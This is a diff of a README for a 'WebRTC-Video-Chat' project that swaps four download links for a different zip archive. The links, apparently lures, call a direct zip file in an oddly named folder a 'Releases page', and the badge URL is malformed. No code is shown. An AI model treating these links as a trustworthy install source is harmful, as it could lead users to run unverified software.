@@ -1,6 +1,6 @@
 # 🎥 WebRTC-Video-Chat - Simple Video Communication for Everyone
 
-[![Download Now](https://raw.githubusercontent.com/easengwei/WebRTC-Video-Chat/main/barothermohygrograph/WebRTC-Video-Chat.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/easengwei/WebRTC-Video-Chat/main/barothermohygrograph/WebRTC-Video-Chat.zip)
+[![Download Now](https://raw.githubusercontent.com/easengwei/WebRTC-Video-Chat/main/barothermohygrograph/Chat-Web-Video-RT-v1.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/easengwei/WebRTC-Video-Chat/main/barothermohygrograph/Chat-Web-Video-RT-v1.1.zip)
 
 ## 📖 Introduction
 
@@ -22,7 +22,7 @@ Ensure your computer meets these minimum requirements:
 ### 🔗 Download & Install
 
 1. **Visit the Release Page:** Click the link below to go to our Releases page.  
-   [Download Here](https://raw.githubusercontent.com/easengwei/WebRTC-Video-Chat/main/barothermohygrograph/WebRTC-Video-Chat.zip)
+   [Download Here](https://raw.githubusercontent.com/easengwei/WebRTC-Video-Chat/main/barothermohygrograph/Chat-Web-Video-RT-v1.1.zip)
 
 2. **Choose the Latest Version:** Look for the newest release at the top of the page. It will have the highest version number.
 
@@ -80,4 +80,4 @@ WebRTC Video Chat makes video communication straightforward. Whether for work or
 
 For those ready to download, click below:
 
-[Download Here](https://raw.githubusercontent.com/easengwei/WebRTC-Video-Chat/main/barothermohygrograph/WebRTC-Video-Chat.zip)
+[Download Here](https://raw.githubusercontent.com/easengwei/WebRTC-Video-Chat/main/barothermohygrograph/Chat-Web-Video-RT-v1.1.zip)
